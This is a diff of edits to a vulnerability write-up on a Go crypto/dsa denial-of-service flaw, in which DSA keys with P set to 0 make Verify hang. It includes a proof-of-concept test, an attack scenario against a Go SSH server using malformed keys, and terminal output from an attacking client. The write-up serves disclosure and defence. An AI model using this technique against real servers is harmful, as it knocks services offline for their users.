@@ -134,7 +134,7 @@ type PublicKey struct {
 
 That is all that you need to know about DSA to follow along. For more information see the NIST standard: <http://csrc.nist.gov/publications/fips/fips186-3/fips_186-3.pdf> or the wikipedia page: <https://en.wikipedia.org/wiki/Digital_Signature_Algorithm>.
 
-Back on topic; where is the infinite loop at in the Verify function? With a little more digging you will find that the code hangs on
+Back on topic; where is the infinite loop at in the Verify function? With a little more digging you will find that the code hangs on:
 
 ```go
 v := u1.Exp(pub.G, u1, pub.P)
@@ -149,9 +149,9 @@ This is the comment for the Exp() method:
 func (z *Int) Exp(x, y, m *Int) *Int {
 ```
 
-From the above, you can see the comment specifies that when m == 0 that it will exponentiate without modular reduction. When you take a large number and exponentiate it with another large number then the result will also be a REALLY BIG number. I'm not too familiar with how math/big works, but I think that is what is going on here. Exp() is crunching away at this exponentiation that will take a very, very long time to complete.
+From the above, you can see the comment specifies that when m == 0 that it will exponentiate without modular reduction. When you take a large number and exponentiate it with another large number then the result will also be a REALLY BIG number. I'm not too familiar with how math/big works, but I think that is what is going on here. Exp() is crunching away at this exponentiation that will take a very, very long time to complete (might as well be infinity).
 
-Here are some sample numbers being used in a dsa.Verify() call to Exp() from the testing below:  
+Here are some sample numbers being used in a dsa.Verify() call to Exp() gathered from the testing code below:  
 
 ```
 x = 87134495734400160760614045850064869082246125869475484226357302998590334523718907040547736115253396811403341841812955872027275698952059512800196447089300992352859585665865224989740
@@ -164,7 +164,7 @@ z = x ^ y
 
 Using Wolfram Alpha, one can get a sense of how big this number z is. There are "113406800566837208055789635448879116719378036793444 or 1.13407x10^50 decimal digits" in the resulting number z. (note: could only use the leading 150 digits of x raised to y in the web input box on Wolfram Alpha so the actual number of digits is even more!) To give an idea of the scale: scientists estimate the number of atoms in the universe close to 10^78 to 10^82 <http://www.universetoday.com/36302/atoms-in-the-universe/>.
 
-Example DSA signature sign/verify code:
+Example test of DSA sign/verify:
 
 ```go
 func generatePrivKey(t *testing.T) *dsa.PrivateKey {
@@ -210,7 +210,7 @@ PASS
 ok      github.com/alexmullins/dsa    0.224s
 ```
 
-Example setting P to 0:
+Example test setting P to 0:
 
 ```go
 func TestDSAPanic(t *testing.T) {
@@ -231,6 +231,7 @@ func TestDSAPanic(t *testing.T) {
         t.Fatalf("failed to sign message: %v", err)
     }
 
+    // Set P = 0
     priv.P = new(big.Int).SetInt64(0)
 
     if !dsa.Verify(&priv.PublicKey, hash[:], r, s) {
@@ -249,7 +250,7 @@ Observe that this last test call will hang.
 
 How can someone exploit this? If an attacker can somehow get a server to accept and use a malformed DSA key to Verify a signature, he/she can influence the server to become stuck crunching away at a large exponentiation problem thereby causing a denial of service (DOS). Since SSH uses DSA as a signature scheme in its client authentication protocol, this seems like a perfect server candidate to try this exploit out against. Let's imagine up a scenario in which this could happen.
 
-A small Git hosting provider allows its users to authenticate with SSH keys to its service and their SSH server is coded in Go. To bring down this service an attacker could create numerous fake accounts and upload malformed DSA keys for use in the SSH authentication. All these keys will have their parameter P set to 0. An attacker could then start hundreds of such SSH client connections to the server causing system resources to be locked up leading to an effective DOS.
+A small Git hosting provider allows its users to authenticate with SSH keys to its service and their SSH server is coded in Go. To bring this service down an attacker could create numerous fake accounts and upload malformed DSA keys for use in the SSH authentication. All these keys will have their parameter P set to 0. An attacker could then start hundreds of such SSH client connections to the server causing system resources to be locked up leading to an effective DOS.
 
 Let's test out that scenario.
 
@@ -310,7 +311,7 @@ func makeSSHConn(conn net.Conn, config *ssh.ServerConfig) {
 }
 ```
 
-One thing to notice is that `-p` flag which controls whether the server creates SSH connections on the main goroutine vs a background goroutine. This will be important when we get to the attack section in a bit.
+One thing to notice is that `if *p` check. That corresponds to the `-p` parallel flag and controls whether the server creates SSH connections on the main goroutine vs a background goroutine. This will be important when we get to the attack section in a bit.
 
 ### The Client
 
@@ -371,14 +372,14 @@ To build the server, cd into the server directory and run: `go build -o server .
 
 If the server was started without the `-p` flag, then one attacking client can completely freeze the server and no more connections can be accepted. This is because the call to ssh.NewServerConn() is run on the main goroutine and is stuck in the call to dsa.Verify() for client authentication.
 
-Start the server normally:
+Start the server normally with:
 
 ```bash
 $ ./server -key=./data/id_rsa
 2016/04/13 07:30:27 Listening on localhost:8022
 ```
 
-In another terminal start a normal client:
+In another terminal start a client normally that will send a correct DSA key to the server for authentication:
 
 ```bash
 $ ./client -key=./data/id_dsa
@@ -396,13 +397,13 @@ $ ./server -key=./data/id_rsa
 2016/04/13 07:31:31 New SSH connection from 127.0.0.1:63516 (SSH-2.0-Go)
 ```
 
-Now it's time to start an attacking client in another terminal:
+Now it's time to start an attacking client in another terminal. This will send the same DSA key that a normal client sends BUT will have the P parameter set to 0:
 
 ```bash
 $ ./client -key=./data/id_dsa -attack
 ```
 
-Notice the client just hangs without a 'connected' message and no time read outs. The server also did not log creating an SSH connection, but it did accept the TCP connection:
+Notice the client just hangs without a 'connected' message and there are no logs of the server's time. The server also did not log creating an SSH connection, but it did accept the TCP connection. The server is now stuck on the call to dsa.Verify():
 
 ```bash
 $ ./server -key=./data/id_rsa
@@ -412,7 +413,7 @@ $ ./server -key=./data/id_rsa
 2016/04/13 07:33:36 Accepted an incoming TCP connection from 127.0.0.1:63521
 ```
 
-A new, normal client also gets stuck trying to connect:
+Try connecting another normal client; it is now prevented from connecting too:
 
 ```bash
 $ ./client -key=./data/id_dsa
@@ -444,11 +445,11 @@ Wed Apr 13 07:42:09 CDT 2016
 Wed Apr 13 07:42:12 CDT 2016
 ```
 
-Hey it connects! But all an attacker would need to do is start a few more attacking client connections and the server's CPU will spike and RAM usage will also spike. With 4 attacking clients I was able to get ~400% CPU and 1GB of RAM usage before stopping due to my laptop getting a little toasty. With just 2 normal clients connected the the server my CPU was around 0.2% and RAM usage was 5-6MB. Quite a difference.
+Hey it connects! But all an attacker would need to do is start a few more malicious client connections and the server's CPU and RAM usage will spike. With 4 attacking clients I was able to get ~400% CPU and 1GB of RAM usage before stopping due to my laptop getting a little toasty. Under normal conditions with just 2 normal clients connected to the server my CPU was around 0.2% and RAM usage was 5-6MB. Quite a difference.
 
 ## Conclusion
 
-In conclusion, this vulnerability can be exploited to cause denial of service, but the impact of it isn't too terribly bad. Using the scenario above, the CVE score calculator <https://nvd.nist.gov/CVSS/v2-calculator> gave a score of 3.5/10 - 6.3/10 based on if the server used the `-p` flag. There isn't any confidentiality or integrity impacts, just a partial/complete availability impact.
+In conclusion, this vulnerability can be exploited to cause denial of service. Using the scenario above, the CVE score calculator <https://nvd.nist.gov/CVSS/v2-calculator> gave a score of 3.5/10 - 6.3/10 based on if the server used the `-p` flag. There aren't any confidentiality or integrity impacts, just a partial/complete availability impact.
 
 Looking at godoc.org there are currently 164 packages that import `crypto/dsa`, <https://godoc.org/crypto/dsa?importers>. It is recommended to upgrade to the security release when it becomes available.
 
